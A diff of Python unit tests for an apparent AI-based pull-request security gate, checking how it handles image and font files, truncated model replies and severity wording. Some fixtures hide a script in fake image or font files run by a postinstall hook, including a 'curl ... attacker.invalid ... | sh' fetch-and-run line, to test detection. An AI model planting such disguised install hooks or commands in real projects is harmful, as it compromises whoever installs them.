+    def test_Q8_so_os_caminhos_de_risco_ainda_grandes_da_parcial_sem_ia(self):
+        leve = "diff --git a/README.md b/README.md\n+x\n"
+        risco = "diff --git a/src/app/api/p.ts b/src/app/api/p.ts\n" + "+y\n" * 1000
+        for modo in ("avisa", "barra"):
+            with self.subTest(modo=modo):
+                codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, env=dict(TODAS, PORTEIRO_MAX_DIFF_KB="1"),
+                                                       modo=modo, diff=leve + risco)
+                self.assertEqual((codigo, modelos), (3, []))
+                self.assertIn("PARCIAL — 2 arquivo(s) não lidos (diff grande)", placar)
+                self.assertIn("mesmo só com os caminhos de risco", placar)
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_Q9_pr_so_de_imagem_ou_fonte_de_verdade_passa(self):
+        for head in ({"public/logo.png": PNG}, {"public/f.ttf": b"\x00\x01\x00\x00\x00\x0c", "public/p.jpg": JPG}):
+            for sem_text in (False, True):
+                for modo in ("avisa", "barra"):
+                    with self.subTest(head=list(head), sem_text=sem_text, modo=modo):
+                        codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, sem_text=sem_text, modo=modo)
+                        self.assertEqual((codigo, modelos), (0, []))
+                        self.assertIn(f"só com arquivos de imagem/fonte ({len(head)})", placar)
+        # Round 6: WOFF2/WebP signatures are printable (JS polyglot): not skipped, binary -> 3.
+        for sem_text in (False, True):
+            codigo, placar, modelos, _ = self.pr({"public/f.woff2": b"wOF2\x00\x01\x00\x00",
+                                                  "public/a.webp": b"RIFF\x1a\x00\x00\x00WEBPVP8 "},
+                                                 {"glm-5": VAZIO_JSON}, sem_text=sem_text)
+            self.assertEqual((codigo, modelos), (3, []))
+            self.assertIn("arquivo binário não lido (2", placar)
+        # ...but never when git lists a file the diff does not carry.
+        with tempfile.TemporaryDirectory() as d:
+            dp, np_ = pr_real(d, BASE, {"public/logo.png": PNG})
+            Path(np_).write_bytes(Path(np_).read_bytes() + b"src/sumiu.ts\0")
+            codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, reais=(dp, np_))
+        self.assertEqual((codigo, modelos), (3, []))
+        self.assertIn("PARCIAL", placar)
+
+    # ---- Round 6: adversarial review of de5b824 (each failed there) ----
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_R1_diff_do_proprio_porteiro_nao_e_binario(self):
+        # This PR's own diff: porteiro.py once held a literal U+FFFD and the gate
+        # called ITSELF "arquivo binário não lido". Only added lines count now.
+        arq, fffd = "scripts/porteiro.py", chr(0xFFFD)
+        fonte = Path(porteiro.__file__).read_bytes()
+        literal = fonte.decode("utf-8").replace("\\" + "ufffd", fffd)  # the source as it was on de5b824
+        self.assertIn(fffd, literal)
+        linhas = literal.split("\n")
+        i = next(n for n, l in enumerate(linhas) if fffd in l)
+        linhas[i - 2] += "  # typo"  # one-line edit next to a U+FFFD context line
+        for nome, base, head in (("new porteiro.py", BASE, {arq: fonte}),
+                                 ("U+FFFD only on '-' lines", {arq: literal.encode()}, {arq: fonte}),
+                                 ("U+FFFD only on context lines", {arq: literal.encode()}, {arq: "\n".join(linhas).encode()})):
+            with self.subTest(nome):
+                with tempfile.TemporaryDirectory() as d:
+                    diff = Path(pr_real(d, base, head)[0]).read_bytes().decode("utf-8", "replace")
+                self.assertEqual([a for a, p in porteiro.blocos(diff) if porteiro.binario(p)], [])
+                codigo, _, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, base=base)
+                self.assertEqual((codigo, modelos), (0, ["glm-5"]))
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_R2_asset_decidido_pelo_lado_novo(self):
+        og, base = "public/og.png", dict(BASE, **{"public/og.png": png_real(32, 32, 1)})
+        # A real PNG modified, or deleted: skipped, no AI call.
+        for nome, head in (("modified", {og: png_real(32, 32, 2)}), ("deleted", {og: None})):
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, base=base)
+                self.assertEqual((codigo, modelos), (0, []))
+                self.assertIn("só com arquivos de imagem/fonte (1)", placar)
+        # Old image overwritten with JS text (NUL only on '-' lines): the model reads it.
+        # Same when the signature line stays and only text is added after it.
+        assinado = dict(BASE, **{og: b"\x89PNG\r\n\x00\x01\nx\n"})
+        for nome, b, head in (("overwrite", base, {og: PAYLOAD}),
+                              ("overwrite + loader", base, {og: PAYLOAD, "next.config.ts": b"require('./public/og.png')\n"}),
+                              ("signature kept, text added", assinado, {og: b"\x89PNG\r\n" + PAYLOAD + b"x\n"})):
+            with self.subTest(nome):
+                _, _, modelos, pedidos = self.pr(head, {"glm-5": VAZIO_JSON}, base=b)
+                self.assertEqual(modelos, ["glm-5"])
+                self.assertIn("execSync", self.viu(pedidos))
+        # Binary that JS still parses (printable start, NUL in a comment): never skipped, 3.
+        loader = {"next.config.ts": b"require('./public/x.png')\n"}
+        for nome, blob in (("public/x.png", b"/*\x00*/" + PAYLOAD), ("public/a.webp", b"RIFF=1/*\x00WEBP*/;" + PAYLOAD),
+                           ("public/f.woff", b"wOFF=1/*\x00*/;" + PAYLOAD), ("public/f.woff2", b"wOF2=1/*\x00*/;" + PAYLOAD),
+                           ("public/a.gif", b"GIF89a=1/*\x00*/;" + PAYLOAD), ("public/f.otf", b"OTTO=1/*\x00*/;" + PAYLOAD)):
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.pr(dict(loader, **{nome: blob}), {"glm-5": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (3, []))
+                self.assertIn("arquivo binário não lido", placar)
+        # Line 1 not in the first hunk: nothing proves the start, so not skipped (3).
+        # a) a real image whose first lines did not change; b) a text .png in main
+        # whose later lines turn binary right after NUL context lines.
+        texto = b"a\n" * 8
+        casos = (("line 1 unchanged", dict(BASE, **{og: png_real(32, 32, 1, texto)}), {og: png_real(32, 32, 2, texto)}),
+                 ("NUL context", dict(BASE, **{og: PAYLOAD + b"a\n" * 6 + b"\x00\n" * 3 + b"z\n"}),
+                  {og: PAYLOAD + b"a\n" * 6 + b"\x00\n" * 3 + b"\x00\x01\n"}))
+        for nome, b, head in casos:
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, base=b)
+                self.assertEqual((codigo, modelos), (3, []))
+                self.assertIn("arquivo binário não lido", placar)
+
+    def test_R3_achado_comecado_e_cortado_da_3(self):
+        cortes = {
+            "C1 title first": '{"achados":[{"titulo":"SQL injection em /api/pay","arquivo":"a","linha":1,"porque":"concatena o id',
+            "C2 English": '{"achados":[{"title":"SQL injection","file":"a","description":"id is concatenated',
+            "C3 inside the key name": '{"achados":[{"severid',
+            "C4 before the value quote": '{"achados":[{"severidade":',
+            "E2 after the value quote": '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"',
+            "findings": '{"findings":[{"title":"SQLi","file":"a',
+            "second list": '{"achados":[],"achados":[{"titulo":"SQLi',
+        }
+        for nome, corte in cortes.items():
+            for fim in ("length", "stop"):
+                with self.subTest(nome, fim=fim):
+                    codigo, placar, modelos, _ = self.roda({"glm-5": [(corte, fim), VAZIO_JSON], "kimi-k3": VAZIO_JSON})
+                    self.assertEqual((codigo, modelos), (3, ["glm-5"]))  # no retry, no reserve
+                    self.assertIn("indício de achado grave", placar)
+        # Cut after a closed empty list is not a finding: the retry may answer.
+        codigo, _, modelos, _ = self.roda({"glm-5": [('{"achados":[]', "length"), VAZIO_JSON]})
+        self.assertEqual((codigo, modelos), (0, ["glm-5", "glm-5"]))
+
+    def test_R4_chaves_repetidas_e_achado_fora_da_lista(self):
+        grave = {"titulo": "SQLi", "arquivo": "a", "severidade": "critica"}
+        barram = {
+            "D6b severidade critica then baixa": '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"critica","severidade":"baixa"}]}',
+            "severity critical then low": '{"achados":[{"title":"SQLi","file":"a","severity":"critical","severity":"low"}]}',
+            "achados [] + findings": json.dumps({"achados": [], "findings": [grave]}),
+            "findings only": json.dumps({"findings": [grave]}),
+            "confianca 0.3 + confidence 0.95": json.dumps({"achados": [dict(grave, confianca=0.3, confidence=0.95)]}),
+            "confianca 0.95 then 0.3": '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"alta","confianca":0.95,"confianca":0.3}]}',
+        }
+        for nome, resposta in barram.items():
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.roda({"glm-5": resposta, "kimi-k3": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (1, ["glm-5"]))
+                self.assertIn("1 bloqueante", placar)
+        # English "findings" is the list itself: empty is a clean 0, a light one a warning.
+        for resposta, esperado in (('{"findings":[]}', "✅ **0 achados**"),
+                                   (json.dumps({"findings": [dict(grave, severidade="baixa")]}), "1 achado · 0 bloqueantes")):
+            with self.subTest(resposta):
+                codigo, placar, modelos, _ = self.roda({"glm-5": resposta, "kimi-k3": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (0, ["glm-5"]))
+                self.assertIn(esperado, placar)
+        # A finding outside the list, or an "achados" that is not a list, is out of format.
+        # With a raw critica it is an indício at once (3, no reserve); a nested
+        # "achados" list is rescued and its critica blocks (1)...
+        todas = ("glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5")
+        for nome, resposta, esperado in (
+                ("vulnerabilities", json.dumps({"achados": [], "vulnerabilities": [grave]}), 3),
+                ("nested", json.dumps({"achados": [], "result": {"achados": [grave]}}), 1),
+                ("achados object then []", '{"achados":' + json.dumps(grave) + ',"achados":[]}', 3)):
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.roda({m: resposta for m in todas})
+                self.assertEqual((codigo, modelos), (esperado, ["glm-5"]))
+                self.assertIn("NÃO ANALISADO" if esperado == 3 else "1 bloqueante", placar)
+        # ...and with only a title every AI tries, then 3.
+        so_titulo = json.dumps({"achados": [], "vulnerabilities": [{"title": "SQLi", "file": "a"}]})
+        codigo, placar, modelos, _ = self.roda({m: so_titulo for m in todas})
+        self.assertEqual((codigo, modelos.count("glm-5"), modelos[-1]), (3, 3, "gpt-5.5"))
+        self.assertIn("nenhuma IA disponível", placar)
+
+    def test_R5_severidade_leve_em_outras_palavras(self):
+        casos = {"minor": "baixa", "Trivial": "baixa", "negligible": "baixa", "N/A": "baixa", "nit": "baixa",
+                 "note": "baixa", "informativo": "baixa", "Low (informational)": "baixa", "Medium (CVSS 5.3)": "media",
+                 "low/critical": "critica", "high / medium": "alta", "baixa/crítica": "critica", "(low)": "alta"}
+        self.assertEqual({k: porteiro._sev(k) for k in casos}, casos)
+        codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, severidade="Minor")]})})
+        self.assertEqual(codigo, 0)  # a warning, even in "barra"
+        self.assertIn("1 achado · 0 bloqueantes", placar)
+
+    # ---- Round 7: adversarial review of 4ee3cb1 (each failed there) ----
+    def test_S1_chaves_em_maiusculas_barram_na_1a_resposta(self):
+        # main's raw GRAVE had re.I. A capitalised key thrown away meant a retry,
+        # and a later [] passed with 0 (main: 3).
+        for nome, resposta in {
+                "Severidade/Titulo": '{"achados":[{"Severidade":"critica","Titulo":"SQLi","Arquivo":"a","Linha":1,"Confianca":0.95}]}',
+                "SEVERIDADE upper": '{"achados":[{"SEVERIDADE":"ALTA","TITULO":"SQLi","ARQUIVO":"a"}]}',
+                "Severity/Title": '{"achados":[{"Severity":"Critical","Title":"SQLi","File":"a"}]}',
+                "Achados key": '{"Achados":[{"severidade":"critica","titulo":"SQLi","arquivo":"a"}]}',
+                "FINDINGS key": '{"FINDINGS":[{"SEVERITY":"HIGH","TITLE":"SQLi","FILE":"a"}]}'}.items():
+            for fim in ("stop", "length"):
+                with self.subTest(nome, fim=fim):
+                    codigo, placar, modelos, _ = self.roda({"glm-5": [(resposta, fim), VAZIO_JSON], "kimi-k3": VAZIO_JSON})
+                    self.assertEqual((codigo, modelos), (1, ["glm-5"]))
+                    self.assertIn("1 bloqueante", placar)
+        # Out of format with a capitalised raw severity: an indício at once (3, no retry).
+        fora = '{"achados":[],"Vulnerabilidades":[{"Severidade":"critica","Titulo":"SQLi"}]}'
+        codigo, placar, modelos, _ = self.roda({"glm-5": [fora, VAZIO_JSON], "kimi-k3": VAZIO_JSON})
+        self.assertEqual((codigo, modelos), (3, ["glm-5"]))
+        self.assertIn("indício de achado grave", placar)
+
+    def test_S2_corte_em_qualquer_ponto_depois_do_achado_nunca_da_0(self):
+        # exp5's sweep: reply[:n] with finish "length", then []. No prefix after the
+        # finding's "{" may end in 0.
+        g = {"titulo": "SQL injection", "arquivo": "a", "linha": 1, "porque": "concatena id", "como_explorar": "id=1 or 1=1"}
+        cheias = {
+            "pt severity first": json.dumps({"achados": [{"severidade": "critica", **g, "confianca": 0.95}]}),
+            "pt title first": json.dumps({"achados": [{**g, "severidade": "alta", "confianca": 0.9}]}),
+            "en findings": json.dumps({"findings": [{"title": "SQLi", "file": "a", "description": "id concat",
+                                                     "severity": "critical", "confidence": 0.9}]}),
+            "fenced": "Resultado:\n```json\n" + json.dumps({"achados": [{"titulo": "SQLi", "severidade": "critica",
+                                                                          "arquivo": "a"}]}, indent=2) + "\n```",
+            "low then critical": json.dumps({"achados": [{"severidade": "baixa", "titulo": "log", "arquivo": "a"},
+                                                         {"titulo": "SQLi", "arquivo": "a", "severidade": "critica"}]}),
+            "capitalised pt": '{"achados":[{"Titulo":"SQLi","Arquivo":"a","Severidade":"critica"}]}',
+            "capitalised en": '{"Findings":[{"Title":"SQLi","File":"a","Severity":"Critical"}]}',
+        }
+        for nome, cheia in cheias.items():
+            inicio = cheia.find("{", cheia.find("["))
+            zeros = [n for n in range(inicio + 1, len(cheia))
+                     if self.roda({"glm-5": [(cheia[:n], "length"), VAZIO_JSON], "kimi-k3": VAZIO_JSON})[0] == 0]
+            with self.subTest(nome):
+                self.assertEqual(zeros, [])
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_S3_ttf_e_avif_so_pulam_com_nul(self):
+        # main never excluded .ttf/.avif: a script named x.ttf with \x89 in front
+        # reached the model. Only a NUL start (a real TTF/AVIF) proves binary there.
+        loader = b'{"name":"x","scripts":{"postinstall":"bash public/fonts/x.EXT"}}\n'
+        for ext in ("ttf", "avif", "TTF"):
+            with self.subTest(ext):
+                head = {f"public/fonts/x.{ext}": b"\x89\n" + PAYLOAD, "package.json": loader.replace(b"EXT", ext.encode())}
+                codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (3, []))
+                self.assertIn("arquivo binário não lido (1", placar)
+        # A real TTF/AVIF (NUL start) and a real PNG still skip.
+        for nome, blob in (("public/f.ttf", b"\x00\x01\x00\x00\x00\x0e\x00\x80\n" + b"\x00" * 20),
+                           ("public/a.avif", b"\x00\x00\x00\x1cftypavif\x00\x00\x00\x00"), ("public/logo.png", PNG)):
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.pr({nome: blob}, {"glm-5": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (0, []))
+                self.assertIn("só com arquivos de imagem/fonte (1)", placar)
+
+    def test_S4_severidade_fora_do_latim_ou_grave_entre_parenteses(self):
+        casos = {"严重": "alta", "高危": "alta", "критический": "alta", "Low (escalates to critical)": "critica",
+                 "baixa (crítica se a rota for pública)": "critica", "(critical)": "critica",
+                 "Low (informational)": "baixa", "Medium (CVSS 5.3)": "media", "(low)": "alta", " ": "media"}
+        self.assertEqual({k: porteiro._sev(k) for k in casos}, casos)
+        for sev in ("严重", "Low (escalates to critical)"):
+            with self.subTest(sev):
+                resposta = json.dumps({"achados": [dict(ALTA, severidade=sev)]}, ensure_ascii=False)
+                codigo, placar, modelos, _ = self.roda({"glm-5": resposta})
+                self.assertEqual((codigo, modelos), (1, ["glm-5"]))
+
+    def test_S5_objeto_solto_com_titulo_nao_estraga_resposta_limpa(self):
+        # Only a LIST of finding-shaped objects outside "achados" is out of format (test_R4).
+        for resposta in ('{"achados":[],"resumo":{"titulo":"Sem achados"}}',
+                         '{"achados":[],"stats":{"severity":{"critica":0,"alta":0}}}'):
+            with self.subTest(resposta):
+                codigo, placar, modelos, _ = self.roda({"glm-5": resposta, "kimi-k3": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (0, ["glm-5"]))
+                self.assertIn("✅ **0 achados**", placar)
+
+    # ---- Round 8: adversarial review of af70ed8 (each failed there, main gave 3) ----
+    def test_T1_severidade_grave_fora_da_lista_da_3(self):
+        # exp6 A: an empty list next to a loose grave severity (any depth, or the
+        # reply's own top level) read as clean (0). It is out of format: indício, 3.
+        for resposta in ('{"findings":[],"detalhe":{"severidade":"critica","titulo":"SQL injection",'
+                         '"arquivo":"a","confianca":0.95}}',
+                         '{"Achados":[],"resumo":{"severidade":"critica"}}',
+                         '{"findings":[],"Severidade":"alta"}',
+                         '{"ACHADOS":[],"severidade":"critica","titulo":"SQLi"}',
+                         '{"findings":[],"stats":{"severidade":"critica"}}'):
+            for fim in ("stop", "length"):
+                with self.subTest(resposta, fim=fim):
+                    codigo, placar, modelos, _ = self.roda({"glm-5": [(resposta, fim), VAZIO_JSON], "kimi-k3": VAZIO_JSON})
+                    self.assertEqual((codigo, modelos), (3, ["glm-5"]))
+                    self.assertIn("indício de achado grave", placar)
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_T2_extensao_com_maiuscula_nao_pula_sem_nul(self):
+        # exp6 B: main's ':(exclude)*.png' is case-sensitive, so x.PNG/x.Jpg/x.ICO
+        # reached the model. A \x89/\xff start in front of a script is not proof.
+        sh = b"curl -s https://attacker.invalid/x | sh\n"
+        for ext, primeiro in (("PNG", b"\x89"), ("Png", b"\x89"), ("JPG", b"\xff"), ("JPEG", b"\xff"),
+                              ("Jpg", b"\x89"), ("ICO", b"\x89")):
+            with self.subTest(ext):
+                head = {f"public/x.{ext}": primeiro + b"\n" + sh,
+                        "package.json": b'{"name":"x","scripts":{"postinstall":"bash public/x.%s"}}\n' % ext.encode()}
+                codigo, placar, _, pedidos = self.pr(head, {"glm-5": VAZIO_JSON})
+                self.assertNotEqual(codigo, 0)
+                self.assertTrue(codigo == 3 or "attacker.invalid" in self.viu(pedidos), (codigo, placar))
+        # A real lowercase PNG still skips.
+        codigo, placar, modelos, _ = self.pr({"public/x.png": png_real(4, 4, 1)}, {"glm-5": VAZIO_JSON})
+        self.assertEqual((codigo, modelos), (0, []))
+        self.assertIn("só com arquivos de imagem/fonte (1)", placar)
 
 
 if __name__ == "__main__":
